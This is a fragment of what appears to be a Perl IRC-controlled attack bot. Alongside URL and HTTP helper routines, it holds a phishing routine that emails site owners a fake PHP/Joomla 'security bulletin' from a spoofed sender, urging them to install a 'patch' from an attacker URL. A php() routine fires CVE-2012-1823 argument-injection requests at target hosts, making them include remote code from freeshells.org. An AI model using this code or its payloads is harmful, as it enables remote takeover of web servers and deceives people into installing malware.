push(@lst,@grep);
}}}
return @lst;
}


sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}

sub print_email($) {


sendraw($IRC_cur_socket, "PRIVMSG #sb :Sending whois Email to @_[1]");


#############################################################################
$subject = 'Joomla Security Vulnerability';
$sender = 'security@joomlasecurity.in';
$recipient = @_[1]; 
#@corpo = 'Security Bullitin for Joomla < 2.5.x <br><br> Joomla versions prior to 2.5 suffer a remote code execution vulnerability which was disclosed to the public recently.<br> The severity of the vulnerability is extremely high and it is highly recommended to update immediately to avoid compromise of your website by using the offical patch.<br><br><br> To patch your Joomla installation download the patch from '.$updateurl.', upload the patch to the root of your web directory.<br> Unzip the patch and follow the steps in your web browser.<br> Select your version of Joomla and click update.<br><br>';
@corpo = 'Security Bullitin for PHP < 4.1.x <br><br> PHP versions higher than 4.1.43 suffer a remote code execution vulnerability which was disclosed to the public recently.<br> The severity of the vulnerability is extremely high and it is highly recommended to update immediately to avoid a code execution vulnerability on your website by using the offical patch.<br><br><br> To patch your PHP installation download the patch from '.$updateurl.', upload the patch to the root of your web directory.<br> Unzip the patch and navigate to the file in your browser.<br> Select your version of PHP, whether you have mod_security and click update. The patch will write a .htaccess file blocking all hack attempts to your website by closing the hole used in the attack<br><br>';
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n"; 
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);

}


#sub find_owner_email($)
#{       #written by T4pout
#
#        my ($domain) = @_;#
#
#        $cmd = "whois $domain".'|grep "@"';
#        $email = `$cmd`;
#
#        $finder->find(\$email);
#
#}

sub php($)
{
sendraw($IRC_cur_socket, "PRIVMSG $printl :Trying php on $host");

#CVE-2012-1823
my ($host) = @_;
my $query = '/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Ffreeshells.org%2Fpov%2Fa.txt%20-n';
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0\r\n\r\n";
close($sock);

my ($host) = @_;
my $query = '/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Ffreeshells.org%2Fpov%2Fa.txt%20-n';
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0\r\n\r\n";
close($sock);

my ($host) = @_;
my $query = '/index.php?+-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Ffreeshells.org%2Fpov%2Fa.txt%20-n';
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0\r\n\r\n";
close($sock);

}






#http://r00tsecurity.org/db/code/40
